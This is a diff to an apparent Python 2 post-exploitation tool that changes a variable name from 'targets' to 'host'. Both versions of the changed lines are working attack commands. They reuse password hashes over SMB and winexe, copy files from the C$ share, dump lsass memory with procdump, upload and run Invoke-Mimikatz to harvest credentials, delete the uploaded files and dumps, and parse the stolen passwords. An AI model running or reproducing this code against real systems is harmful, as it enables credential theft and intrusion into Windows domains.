@@ -72,7 +72,7 @@ def datadump(user, passw, host, path, os_version):
 			for f in files:
 				try:
 					print colored("[+]getting: "+f,'yellow')
-					os.system("/usr/bin/pth-smbclient //"+targets+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+path+host+"; get "+f+"\' 2>/dev/null")
+					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+path+host+"; get "+f+"\' 2>/dev/null")
 				except OSError:
 					print colored("[-]Something went wrong here getting files via smbclient("+f+"): "+host,'red')
 			try:
@@ -120,7 +120,7 @@ def datadump(user, passw, host, path, os_version):
 			if service_accounts in yesanswers:
 				print colored("[+]Checking for services running as users: "+host,'yellow')
 				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+host+" \"cmd.exe /C wmic service get startname | findstr /i /V startname | findstr /i /V NT | findstr /i /V localsystem > c:\users.txt\" 2>/dev/null")
-				os.system("/usr/bin/pth-smbclient //"+targets+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+path+host+"; get users.txt\' 2>/dev/null")
+				os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+path+host+"; get users.txt\' 2>/dev/null")
 				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+host+" \"cmd.exe /C del c:\users.txt\" 2>/dev/null")
 				res = os.stat(path+host+"/users.txt").st_size > 3
 				if res==True:
@@ -143,11 +143,11 @@ def datadump(user, passw, host, path, os_version):
 					print colored("[+]Procdump.exe found",'green')
 				try:
 					print colored("[+]getting dump of lsass: "+host,'green')
-					os.system("/usr/bin/pth-smbclient //"+targets+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /opt/Procdump; put procdump.exe\' 2>/dev/null")      			
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+targets+" \"cmd.exe /C c:\procdump.exe  -accepteula -ma lsass.exe c:\\lsass.dmp\" >/dev/null 2>&1")
-					os.system("/usr/bin/pth-smbclient //"+targets+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets+"; get lsass.dmp\' 2>/dev/null")
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+targets+" \"cmd.exe /C del c:\\procdump.exe && del c:\\lsass.dmp\" 2>/dev/null")
-					if os.path.isfile(outputpath+targets+"/lsass.dmp"):
+					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /opt/Procdump; put procdump.exe\' 2>/dev/null")      			
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+host+" \"cmd.exe /C c:\procdump.exe  -accepteula -ma lsass.exe c:\\lsass.dmp\" >/dev/null 2>&1")
+					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get lsass.dmp\' 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+host+" \"cmd.exe /C del c:\\procdump.exe && del c:\\lsass.dmp\" 2>/dev/null")
+					if os.path.isfile(outputpath+host+"/lsass.dmp"):
 						print colored("[+]lsass.dmp file found",'green')
 					else:
 						print colored("[-]lsass.dmp file not found",'red')        
@@ -162,22 +162,22 @@ def datadump(user, passw, host, path, os_version):
 					fout.write('Invoke-Mimikatz -DumpCreds > c:\\mimi_creddump.txt\n')
 					fout.write('exit\n')
 					fout.close() 
-					os.system("/usr/bin/pth-smbclient //"+targets+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put mimi.ps1\' 2>/dev/null")
-					os.system("/usr/bin/pth-smbclient //"+targets+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /usr/share/nishang/Gather; put Invoke-Mimikatz.ps1\' 2>/dev/null")
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+targets+" \"cmd /c echo . | powershell.exe -NonInteractive -NoProfile -ExecutionPolicy ByPass -File c:\\mimi.ps1  -Verb RunAs\" 2>/dev/null")
-					os.system("/usr/bin/pth-smbclient //"+targets+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets+"; get mimi_creddump.txt\' 2>/dev/null")
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+targets+" \"cmd.exe /C del c:\\mimi_creddump.txt c:\\Invoke-Mimikatz.ps1 c:\\mimi.ps1\" 2>/dev/null") 
-					if os.path.isfile(outputpath+targets+"/mimi_creddump.txt"):
+					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put mimi.ps1\' 2>/dev/null")
+					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /usr/share/nishang/Gather; put Invoke-Mimikatz.ps1\' 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+host+" \"cmd /c echo . | powershell.exe -NonInteractive -NoProfile -ExecutionPolicy ByPass -File c:\\mimi.ps1  -Verb RunAs\" 2>/dev/null")
+					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get mimi_creddump.txt\' 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+host+" \"cmd.exe /C del c:\\mimi_creddump.txt c:\\Invoke-Mimikatz.ps1 c:\\mimi.ps1\" 2>/dev/null") 
+					if os.path.isfile(outputpath+host+"/mimi_creddump.txt"):
 						print colored("[+]mimi_creddump.txt file found",'green')
 						if not os.path.isfile('/usr/bin/dos2unix'):
 							print colored("[-]Cannot find dos2unix",'red')
 							exit(1)				
 						else:
 							print colored("[+]Found dos2unix",'green')
-							os.system("dos2unix "+outputpath+targets+"/mimi_creddump.txt 2>/dev/null")
-							print colored("[+] Mimikatz output stored in "+outputpath+targets+"/mimi_creddump.txt",'yellow')
+							os.system("dos2unix "+outputpath+host+"/mimi_creddump.txt 2>/dev/null")
+							print colored("[+] Mimikatz output stored in "+outputpath+host+"/mimi_creddump.txt",'yellow')
 							print colored("[+] Basic parsed output:",'green')
-							os.system("cat "+outputpath+targets+"/mimi_creddump.txt"+" |tr -d '\011\015' |awk '/Username/ { user=$0; getline; domain=$0; getline; print user \" \" domain \" \" $0}'|grep -v \"* LM\|* NTLM\|Microsoft_OC1\|* Password : (null)\"|awk '{if (length($12)>2) print $8 \"\\\\\" $4 \":\" $12}'|sort -u")
+							os.system("cat "+outputpath+host+"/mimi_creddump.txt"+" |tr -d '\011\015' |awk '/Username/ { user=$0; getline; domain=$0; getline; print user \" \" domain \" \" $0}'|grep -v \"* LM\|* NTLM\|Microsoft_OC1\|* Password : (null)\"|awk '{if (length($12)>2) print $8 \"\\\\\" $4 \":\" $12}'|sort -u")
 					else:
 						print colored("[-]mimi_creddump.txt file not found",'red')       
 				except OSError:
